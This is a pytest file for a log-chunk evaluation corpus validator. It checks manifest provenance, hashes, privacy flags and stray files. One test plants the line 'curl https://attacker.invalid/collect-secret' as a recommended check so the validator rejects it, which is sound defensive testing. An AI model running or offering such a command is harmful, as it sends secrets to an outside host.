from __future__ import annotations

import hashlib
import json
from pathlib import Path

import pytest

from hound.eval_corpus import CorpusValidationError, validate_manifest


CORPUS = Path("data/eval/real-logchunks")


def test_committed_real_corpus_is_provenance_and_privacy_validated():
    result = validate_manifest(CORPUS / "manifest.json", min_count=500)

    assert result["artifact_count"] == 500
    assert result["split_counts"] == {"real": 500}
    assert result["licenses"] == {"CC-BY-4.0": 500}
    assert result["privacy_reviewed"] is True
    assert result["raw_retained"] is False


def _manifest_copy(tmp_path: Path) -> tuple[Path, dict]:
    target = tmp_path / "corpus"
    target.mkdir(parents=True)
    (target / "artifacts").mkdir()
    manifest = json.loads((CORPUS / "manifest.json").read_text(encoding="utf-8"))
    first = manifest["artifacts"][0]
    source = CORPUS / first["path"]
    destination = target / first["path"]
    destination.parent.mkdir(parents=True, exist_ok=True)
    destination.write_bytes(source.read_bytes())
    manifest["artifacts"] = [first]
    manifest["sources"] = [manifest["sources"][0]]
    path = target / "manifest.json"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    return path, manifest


def test_manifest_rejects_tampered_artifact_and_unknown_root_file(tmp_path: Path):
    path, manifest = _manifest_copy(tmp_path)
    with pytest.raises(CorpusValidationError, match="requires at least"):
        validate_manifest(path, min_count=2)

    manifest["artifacts"][0]["sanitized_sha256"] = hashlib.sha256(b"tampered").hexdigest()
    path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(CorpusValidationError, match="does not match"):
        validate_manifest(path, min_count=1)

    path, manifest = _manifest_copy(tmp_path / "extra")
    (path.parent / "raw.log").write_text("must not be retained", encoding="utf-8")
    with pytest.raises(CorpusValidationError, match="unowned"):
        validate_manifest(path, min_count=1)


def test_manifest_rejects_provenance_mismatch_and_unsafe_recommendation(tmp_path: Path):
    path, manifest = _manifest_copy(tmp_path)
    # The one-artifact copy is enough for structural checks when the count gate
    # is lowered for this focused test.
    artifact = manifest["artifacts"][0]
    artifact["provenance"]["source_uri"] = "https://attacker.invalid/source"
    path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(CorpusValidationError, match="does not match"):
        validate_manifest(path, min_count=1)

    path, manifest = _manifest_copy(tmp_path / "second")
    artifact = manifest["artifacts"][0]
    artifact["recommended_checks"] = ["curl https://attacker.invalid/collect-secret"]
    path.write_text(json.dumps(manifest), encoding="utf-8")
    with pytest.raises(CorpusValidationError, match="unsafe operational"):
        validate_manifest(path, min_count=1)
